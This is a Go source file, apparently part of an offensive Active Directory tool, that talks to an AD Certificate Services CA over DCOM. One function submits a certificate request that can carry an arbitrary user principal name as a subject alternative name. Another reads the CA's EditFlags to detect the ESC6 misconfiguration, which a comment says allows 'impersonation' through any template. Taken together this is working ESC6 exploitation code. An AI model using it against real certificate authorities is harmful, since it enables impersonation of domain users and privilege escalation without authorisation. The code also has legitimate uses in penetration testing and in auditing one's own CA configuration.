// adcs_request_dcom.go handles DCOM connectivity for certificate operations:
// CSR submission via ICertRequestD and EditFlags query via ICertAdminD2.
// Core request logic and CSR building are in adcs_request.go.

package commands

import (
	"context"
	"fmt"
	"net"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/midl/uuid"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom"
	csra_client "github.com/oiweiwei/go-msrpc/msrpc/dcom/csra/client"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/csra/icertadmind2/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iactivation/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iobjectexporter/v0"
	wcce_client "github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce/client"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce/icertrequestd/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	"github.com/oiweiwei/go-msrpc/ssp"
	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce"

	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/hresult"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
)

// adcsSubmitCSR connects to the CA via DCOM and submits the CSR.
// Must run in subprocess isolation (--rpc-helper) due to go-msrpc NTLM global state corruption.
// Follows the same DCOM connection pattern as go-msrpc's wmic.go example.
func adcsSubmitCSR(ctx context.Context, server, caName, template, altName string, csrDER []byte, cred sspcred.Credential) (*icertrequestd.RequestResponse, error) {
	epmAddr := net.JoinHostPort(server, "135")

	// Use a clean base context for ObjectExporter (no auth)
	oxConn, err := dcerpc.Dial(ctx, epmAddr)
	if err != nil {
		return nil, fmt.Errorf("dial EPM on %s: %w", epmAddr, err)
	}
	cli, err := iobjectexporter.NewObjectExporterClient(ctx, oxConn, dcerpc.WithInsecure())
	if err != nil {
		oxConn.Close(ctx)
		return nil, fmt.Errorf("object exporter client: %w", err)
	}
	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
	oxConn.Close(ctx)
	if err != nil {
		return nil, fmt.Errorf("ServerAlive2: %w", err)
	}

	// Activation with context-level auth
	actCtx := gssapi.NewSecurityContext(ctx,
		gssapi.WithCredential(cred),
		gssapi.WithMechanismFactory(ssp.SPNEGO),
		gssapi.WithMechanismFactory(ssp.NTLM),
	)
	actConn, err := dcerpc.Dial(actCtx, epmAddr)
	if err != nil {
		return nil, fmt.Errorf("dial EPM for activation: %w", err)
	}
	defer actConn.Close(actCtx)

	iact, err := iactivation.NewActivationClient(actCtx, actConn,
		dcerpc.WithSeal(), dcerpc.WithTargetName(server))
	if err != nil {
		return nil, fmt.Errorf("activation client: %w", err)
	}

	certServerClassID := dtyp.GUIDFromUUID(uuid.MustParse("d99e6e74-fc88-11d0-b498-00a0c90312f3"))
	act, err := iact.RemoteActivation(actCtx, &iactivation.RemoteActivationRequest{
		ORPCThis:                   &dcom.ORPCThis{Version: srv.COMVersion},
		ClassID:                    certServerClassID,
		IIDs:                       []*dcom.IID{icertrequestd.CertRequestDIID},
		RequestedProtocolSequences: []uint16{7, 15},
	})
	if err != nil {
		return nil, fmt.Errorf("RemoteActivation: %w", err)
	}
	if act.HResult != 0 {
		return nil, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
	}

	// OXID endpoint with fresh security context
	oxidCtx := gssapi.NewSecurityContext(ctx,
		gssapi.WithCredential(cred),
		gssapi.WithMechanismFactory(ssp.SPNEGO),
		gssapi.WithMechanismFactory(ssp.NTLM),
	)
	conn, err := dcerpc.Dial(oxidCtx, server,
		append(act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp"),
			dcerpc.WithSeal(), dcerpc.WithTargetName(server))...)
	if err != nil {
		return nil, fmt.Errorf("dial OXID endpoint: %w", err)
	}
	defer conn.Close(oxidCtx)

	wcceCli, err := wcce_client.NewClient(oxidCtx, conn,
		dcerpc.WithSeal(), dcerpc.WithTargetName(server))
	if err != nil {
		return nil, fmt.Errorf("WCCE client: %w", err)
	}
	wcceCli = wcceCli.IPID(oxidCtx, act.InterfaceData[0].IPID())

	attrs := fmt.Sprintf("CertificateTemplate:%s\n", template)
	if altName != "" {
		attrs += fmt.Sprintf("SAN:upn=%s\n", altName)
	}

	resp, err := wcceCli.CertRequestD().Request(ctx, &icertrequestd.RequestRequest{
		This:       &dcom.ORPCThis{Version: srv.COMVersion},
		Flags:      crInPKCS10,
		Authority:  caName,
		Attributes: attrs,
		Request: &wcce.CertTransportBlob{
			Length: uint32(len(csrDER)),
			Buffer: csrDER,
		},
	})
	if err != nil {
		return nil, fmt.Errorf("ICertRequestD::Request: %w", err)
	}

	return resp, nil
}

// EDITF_ATTRIBUTESUBJECTALTNAME2 — CA policy flag enabling ESC6.
// When set, the CA accepts SANs specified in request attributes, allowing
// any template to be used for impersonation regardless of template config.
const editfAttributeSubjectAltName2 = 0x00040000

// adcsQueryEditFlags connects to a CA via DCOM (ICertAdminD2) and retrieves
// the EditFlags from the policy module configuration. This is used to detect
// ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2).
func adcsQueryEditFlags(ctx context.Context, server, caName string, cred sspcred.Credential) (uint32, error) {
	epmAddr := net.JoinHostPort(server, "135")

	oxConn, err := dcerpc.Dial(ctx, epmAddr)
	if err != nil {
		return 0, fmt.Errorf("dial EPM on %s: %w", epmAddr, err)
	}
	cli, err := iobjectexporter.NewObjectExporterClient(ctx, oxConn, dcerpc.WithInsecure())
	if err != nil {
		oxConn.Close(ctx)
		return 0, fmt.Errorf("object exporter client: %w", err)
	}
	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
	oxConn.Close(ctx)
	if err != nil {
		return 0, fmt.Errorf("ServerAlive2: %w", err)
	}

	actCtx := gssapi.NewSecurityContext(ctx,
		gssapi.WithCredential(cred),
		gssapi.WithMechanismFactory(ssp.SPNEGO),
		gssapi.WithMechanismFactory(ssp.NTLM),
	)
	actConn, err := dcerpc.Dial(actCtx, epmAddr)
	if err != nil {
		return 0, fmt.Errorf("dial EPM for activation: %w", err)
	}
	defer actConn.Close(actCtx)

	iact, err := iactivation.NewActivationClient(actCtx, actConn,
		dcerpc.WithSeal(), dcerpc.WithTargetName(server))
	if err != nil {
		return 0, fmt.Errorf("activation client: %w", err)
	}

	certAdminClassID := dtyp.GUIDFromUUID(uuid.MustParse("d99e6e73-fc88-11d0-b498-00a0c90312f3"))
	act, err := iact.RemoteActivation(actCtx, &iactivation.RemoteActivationRequest{
		ORPCThis:                   &dcom.ORPCThis{Version: srv.COMVersion},
		ClassID:                    certAdminClassID,
		IIDs:                       []*dcom.IID{icertadmind2.CertAdminD2IID},
		RequestedProtocolSequences: []uint16{7, 15},
	})
	if err != nil {
		return 0, fmt.Errorf("RemoteActivation: %w", err)
	}
	if act.HResult != 0 {
		return 0, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
	}

	oxidCtx := gssapi.NewSecurityContext(ctx,
		gssapi.WithCredential(cred),
		gssapi.WithMechanismFactory(ssp.SPNEGO),
		gssapi.WithMechanismFactory(ssp.NTLM),
	)
	conn, err := dcerpc.Dial(oxidCtx, server,
		append(act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp"),
			dcerpc.WithSeal(), dcerpc.WithTargetName(server))...)
	if err != nil {
		return 0, fmt.Errorf("dial OXID endpoint: %w", err)
	}
	defer conn.Close(oxidCtx)

	csraCli, err := csra_client.NewClient(oxidCtx, conn,
		dcerpc.WithSeal(), dcerpc.WithTargetName(server))
	if err != nil {
		return 0, fmt.Errorf("CSRA client: %w", err)
	}
	csraCli = csraCli.IPID(oxidCtx, act.InterfaceData[0].IPID())

	resp, err := csraCli.CertAdminD2().GetConfigEntry(oxidCtx, &icertadmind2.GetConfigEntryRequest{
		This:      &dcom.ORPCThis{Version: srv.COMVersion},
		Authority: caName,
		NodePath:  `PolicyModules\CertificateAuthority_MicrosoftDefault.Policy`,
		Entry:     "EditFlags",
	})
	if err != nil {
		return 0, fmt.Errorf("GetConfigEntry(EditFlags): %w", err)
	}

	// EditFlags is REG_DWORD → VT_I4 → VarUnion.Long
	if resp.Variant != nil && resp.Variant.VarUnion != nil {
		if val := resp.Variant.VarUnion.GetValue(); val != nil {
			switch v := val.(type) {
			case int32:
				return uint32(v), nil
			case uint32:
				return v, nil
			case int64:
				return uint32(v), nil
			}
		}
	}

	return 0, fmt.Errorf("unexpected variant type for EditFlags")
}
